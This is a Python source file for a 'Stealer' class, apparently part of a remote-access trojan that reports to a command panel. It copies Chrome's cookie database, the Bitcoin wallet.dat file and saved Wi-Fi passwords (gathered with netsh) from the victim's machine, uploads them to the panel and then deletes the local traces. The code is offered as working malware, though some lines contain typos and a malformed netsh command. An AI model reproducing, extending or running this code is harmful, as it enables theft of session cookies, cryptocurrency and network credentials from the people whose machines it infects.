import tempfile
import subprocess
import re
import os
import getpass
import shutil
from HTTPSocket import HTTPSocket

class Stealer:
    def __init__(self, panelURL, machineID):
        self.C = HTTPSocket(str(panelURL), str(machineID))
        self.tempdir = tempfile.gettempdir()
        self.username = getpass.getuser()

    def steal_chrome_cookie(self):
        # Chrome DB Path: C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies
        try:
            source = f"C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
            destination = f"{self.tempdir}\\CookiesCh.sqlite"

            shutil.copyfile(source, destination)

            self.C.Upload(destination)
            os.remove(destination)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Stealed Chrome Cookies Successfully")
        except Exception as e:
            print("[Error In Stealer steal_chrome_cookie() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))

    def steal_firefox_cookie(self):
        pass



    def steal_bitcoin_wallet(self):
        try:
            wallet_path = f"C:\\Users\\{self.username}\\AppData\\Bitcoin\\wallet.dat"
            if os.path.exists(wallet_path):
                self.C.Upload(wallet_path)
                self.C.Send("CleanCommands")
                self.C.Log("Succ", "Stealed Bitcoin Wallet Successfully")
            else:
                self.C.Send("CleanCommands")
                self.C.Log("Fail", "Bitcoin Wallet Not Found In Victim PC")
        except Exception as e:
            print("[Error In Stealer, steal_bitcoin_wallet() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred :" + str(e))




    def steal_wifi_password(self):
        try:
            os.chdir(self.tempdir)
            command = "netsh wlan show profile"
            result = ""

            networks = subprocess.check_output(command, shell=True, strderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            networks = networks.decode(encoding="utf-8", errors="strcit")
            networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

            for network_name in networks_names_list:
                try:
                    command = "netsh wlan show profile" + "network_name" + "key=clear"
                    current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                    current_result = current_result.decode(encoding="utf-8", errors="strict")

                    ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                    authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                    cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                    security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                    password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)

                    result += "\n\nSSID            : " + ssid[0] + "\n"
                    result += "Authentication      : " + authentication[0] + "\n"
                    result += "Cipher              : " + cipher[0] + "\n"
                    result += "Security Key        : " + security_key[0] + "\n"
                    result += "Password            : " + password[0] + "\n"

                except Exception:
                    pass

            with open("WiFiPassword.txt", "w") as f:
                f.write(result)

            self.C.Upload(self.tempdir + "\\WiFiPassword.txt")
            os.remove(self.tempdir + "\\WiFiPassword.txt")
            self.C.Log("Succ", "WiFi Password Retrived Successfully")
            self.C.Send("CleanCommands")

        except Exception as e:
            print("[Error In Stealer, steal_wifi_password() Function]")
            print(f"[Error] : {e}")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))
            self.C.Send("CleanCommands")





















